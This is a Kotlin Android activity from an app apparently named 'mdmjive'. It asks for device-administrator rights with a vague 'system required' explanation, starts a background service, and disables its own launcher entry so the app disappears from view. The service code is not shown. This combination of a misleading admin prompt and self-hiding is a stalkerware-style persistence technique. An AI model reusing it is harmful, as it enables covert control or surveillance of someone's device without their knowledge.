package com.example.mdmjive

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import com.example.mdmjive.services.MDMService
import com.example.mdmjive.receivers.MDMDeviceAdminReceiver

class MainActivity : ComponentActivity() {
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var componentName: ComponentName

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        try {
            // Inicializar componentes de administración
            devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            componentName = ComponentName(this, MDMDeviceAdminReceiver::class.java)

            // Verificar y solicitar permisos si es necesario
            if (!devicePolicyManager.isAdminActive(componentName)) {
                requestAdminPrivileges()
            } else {
                // Si ya tenemos permisos, iniciamos el servicio y ocultamos la app
                startMDMService()
                hideApp()
            }
        } catch (e: Exception) {
            Log.e("MDM", "Error en onCreate: ${e.message}")
        }

        // Cerrar la actividad inmediatamente
        finish()
    }

    private fun requestAdminPrivileges() {
        try {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Sistema requerido para el funcionamiento del dispositivo")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e("MDM", "Error al solicitar permisos: ${e.message}")
        }
    }

    private fun startMDMService() {
        try {
            val serviceIntent = Intent(this, MDMService::class.java)
            startService(serviceIntent)
            Log.d("MDM", "Servicio MDM iniciado")
        } catch (e: Exception) {
            Log.e("MDM", "Error al iniciar servicio: ${e.message}")
        }
    }

    private fun hideApp() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d("MDM", "Aplicación ocultada exitosamente")
        } catch (e: Exception) {
            Log.e("MDM", "Error al ocultar app: ${e.message}")
        }
    }
}